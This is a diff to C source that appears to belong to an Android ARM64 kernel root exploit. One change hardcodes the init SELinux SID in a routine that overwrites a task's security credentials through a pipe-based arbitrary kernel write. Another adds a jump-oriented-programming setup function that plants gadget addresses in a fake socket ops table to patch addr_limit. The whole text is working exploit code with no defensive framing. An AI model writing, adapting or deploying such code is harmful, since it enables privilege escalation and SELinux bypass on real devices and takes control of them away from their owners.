@@ -3,8 +3,9 @@
 #include <fcntl.h>
 #include <inttypes.h>
 
+#include "offsets.h"
 #include "threadinfo.h"
-#include "sid.h"
+
 
 #define __user
 #define __kernel
@@ -125,7 +126,7 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 			&& tss.keycreate_sid == 0
 			&& tss.sockcreate_sid == 0)
 		{
-			unsigned int sid = get_sid("init");
+			unsigned int sid = 1;
 			if(sid)
 			{
 				write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
@@ -200,5 +201,28 @@ LOAD:FFFFFFC0003C66EC                 BLR             X1
 */
 	addr[4] = jopret; //[x0, 0x20]
 }
+
+
+/*********************************************************************
+ROM:FFFFFFC000674000                 LDR             X2, [X0,#0x150]
+ROM:FFFFFFC000674004                 ADD             X0, X29, #0x48
+ROM:FFFFFFC000674008                 BLR             X2
+*********************************************************************/
+
+void preparejop2(void** addr, void* offsets_param)
+{
+	unsigned int i;
+	char *dst = (char*)addr;
+	struct offsets2 *o_param = (struct offsets2 *)offsets_param;
+
+	for(i = 0; i < (0x1000 / sizeof(int)); i++)
+		((int*)addr)[i] = 0xDEAD;
+
+	*(uint64_t*)(dst + o_param->sock_ops_offset) = (uint64_t)addr;
+	*(uint64_t*)(dst + o_param->ops_setsockopt_offset) = (uint64_t)(o_param->patch_addr_limit_jopret);
+
+	*(uint64_t*)(dst + o_param->get_threadinfo_jopret_offset) = (uint64_t)(o_param->get_threadinfo_jopret);
+}
+
 
 #endif
